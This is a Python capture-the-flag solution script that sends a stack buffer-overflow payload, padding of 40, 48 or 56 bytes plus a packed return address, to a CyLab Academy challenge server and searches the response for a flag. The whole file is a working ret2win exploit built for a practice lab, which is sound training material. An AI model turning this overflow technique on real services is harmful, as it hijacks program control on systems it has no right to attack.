import sys, socket, time, re, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 29401
WIN = 0x401256
for off in (40, 48, 56):
    for extra in (b"",):
        try:
            s = socket.create_connection((HOST, PORT), timeout=12)
            s.settimeout(5)
            time.sleep(0.6)
            try:
                s.recv(4096)
            except Exception:
                pass
            payload = b"A" * off + struct.pack("<Q", WIN)
            s.sendall(payload)
            time.sleep(0.8)
            out = b""
            try:
                out = s.recv(65536)
            except Exception:
                pass
            txt = out.decode("utf-8", "replace")
            print(f"--- off={off} ---")
            print(txt[:300])
            m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
            if m:
                print("FLAG:", m.group(0))
                s.close()
                sys.exit(0)
            s.close()
        except Exception as e:
            print(off, "err", type(e).__name__)
